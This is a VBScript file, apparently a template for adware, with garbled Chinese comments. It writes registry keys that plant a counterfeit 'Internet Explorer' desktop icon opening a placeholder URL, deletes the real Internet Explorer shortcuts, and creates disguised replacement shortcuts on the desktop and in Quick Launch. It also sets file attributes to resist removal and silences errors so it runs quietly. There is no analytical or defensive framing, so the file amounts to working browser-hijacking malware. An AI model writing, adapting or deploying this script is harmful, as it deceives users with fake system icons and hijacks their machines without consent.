

On Error Resume Next '���������� ��Ȼ����ִ��
Dim Url,IePath ,QuickPath,strDesktop

Url="{Url}"
Dim WSHShell
Set WSHShell = WScript.CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Dim RegPath,Temp

Dim ShowSID '�û�SID 
Const HKEY_USERS = &H80000003
strComputer = "."
'Set StdOut = WScript.StdOut
Set oReg=GetObject("winmgmts:{impersonationLevel=impersonate}!\\" & strComputer & "\root\default:StdRegProv")
strKeyPath = ""
oReg.EnumKey HKEY_USERS, strKeyPath, arrSubKeys
For Each subkey In arrSubKeys
  ' StdOut.WriteLine subkey
   ShowSID = subkey
   If Len(ShowSID)> 30 And InStr(ShowSID,"_Classes")=0 Then
    Exit For
    End if
  ' MsgBox(subkey)
Next

IePath = WSHShell.ExpandEnvironmentStrings("%ProgramFiles%") & "\Internet Explorer\iexplore.exe" 'IE·��

RegPath = "HKEY_USERS\" & ShowSID & "\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\"

Temp = RegPath & "Desktop"
strDesktop=WSHShell.RegRead(Temp) 
'strDesktop = WSHShell.SpecialFolders("Desktop")  '����·��

Temp      = RegPath & "AppData"
QuickPath =WSHShell.RegRead(Temp) 

QuickPath = QuickPath  & "\Microsoft\Internet Explorer\Quick Launch\" ''���������


'MsgBox(QuickPath)


'RegPath = "HKEY_USERS\" & ShowSID & "\Software\Microsoft\Internet Explorer\Main\Start Page"
'WSHShell.RegWrite RegPath ,Url, "REG_SZ"

'RegPath = "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main\Start Page"
'WSHShell.RegWrite RegPath ,Url, "REG_SZ"

RegPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command\"
'WSHShell.RegWrite RegPath ,"""" & IePath & """ " & Url, "REG_SZ"

RegPath = "HKEY_USERS\" & ShowSID & "\SOFTWARE\Classes\CLSID\{871C5380-42A0-1069-A2EA-08002B30309D}\shell\OpenHomePage\Command\"
'WSHShell.RegWrite RegPath ,"""" & IePath & """ " & Url, "REG_SZ"


Set WSHShell = WScript.CreateObject("WScript.Shell")

RegPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{E188F7A3-A04E-413E-99D1-D79A45F78506}\"
WSHShell.RegWrite RegPath , "Internet Explorer" , "REG_SZ"

RegPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{E188F7A3-A04E-413E-99D1-D79A45F78506}\DefaultIcon\"
WSHShell.RegWrite RegPath , """" & IePath & """" , "REG_SZ"

RegPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{E188F7A3-A04E-413E-99D1-D79A45F78506}\InprocServer32\"
WSHShell.RegWrite RegPath , """" & IePath & """" , "REG_SZ"

RegPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{E188F7A3-A04E-413E-99D1-D79A45F78506}\InprocServer32\InprocServer32"
WSHShell.RegWrite RegPath , "Apartment" , "REG_SZ"

RegPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{E188F7A3-A04E-413E-99D1-D79A45F78506}\Shell\open\"
WSHShell.RegWrite RegPath , "����ҳ(&H)" , "REG_SZ"


RegPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{E188F7A3-A04E-413E-99D1-D79A45F78506}\Shell\open\command\"
WSHShell.RegWrite RegPath , """" & IePath & """ " & Url , "REG_SZ"


RegPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{E188F7A3-A04E-413E-99D1-D79A45F78506}\Shell\����(&R)\"
WSHShell.RegWrite RegPath , "����(&R)" , "REG_SZ"



RegPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{E188F7A3-A04E-413E-99D1-D79A45F78506}\Shell\����(&R)\Command\"
WSHShell.RegWrite RegPath , "Rundll32.exe Shell32.dll,Control_RunDLL Inetcpl.cpl" , "REG_SZ"


RegPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{E188F7A3-A04E-413E-99D1-D79A45F78506}\ShellFolder\Attributes"
WSHShell.RegWrite RegPath , 0 , "REG_DWORD"


RegPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{E188F7A3-A04E-413E-99D1-D79A45F78506}\"
WSHShell.RegWrite RegPath ,Default



set oShellLink = WshShell.CreateShortcut(strDesktop & "\Internet Explorer.lnk")
oShellLink.TargetPath = Url
oShellLink.Description = "Internet Explorer"
oShellLink.IconLocation = "%ProgramFiles%\Internet Explorer\iexplore.exe, 0" 
oShellLink.Save

' editNTFSACL strDesktop & "\Internet Explorer.lnk","R" 

'------ɾ����ɾ�Ķ���-------
Dim delIePath
delIePath = QuickPath & "\Internet Explorer.lnk"
 
if objFSO.FileExists(delIePath) Then objFSO.DeleteFile(delIePath)

delIePath = QuickPath & "\���� Internet Explorer �����.lnk"
if objFSO.FileExists(delIePath) Then objFSO.DeleteFile(delIePath)


set oShellLink = WshShell.CreateShortcut(QuickPath & "\���� Internet Explorer �����.lnk") 
oShellLink.TargetPath = Url
oShellLink.Description = "Internet Explorer"
oShellLink.IconLocation = "%ProgramFiles%\Internet Explorer\iexplore.exe, 0" 
oShellLink.Save
editNTFSACL strDesktop & "\Internet Explorer.lnk","R" 



'MsgBox(delIePath)

Sub CreateLink(ProgramPath,ProgramArg,LinkPath,Descr)
'=============��ӿ�ݷ�ʽ  =================
' ProgramPath ��ݷ�ʽ��ַ
' ProgramArg ����
' LinkPath ��ݷ�ʽ�ļ����ڵ�ַ
' Descr����
 
End sub

Sub editNTFSACL(fileName,Perm)

 Set objFile = objFSO.GetFile(fileName)
 objFile.Attributes= 4 or 5
 
' WSHShell.run "echo Y|cacls " & fileName & " /G Everyone:" & Perm & " /C"
End sub




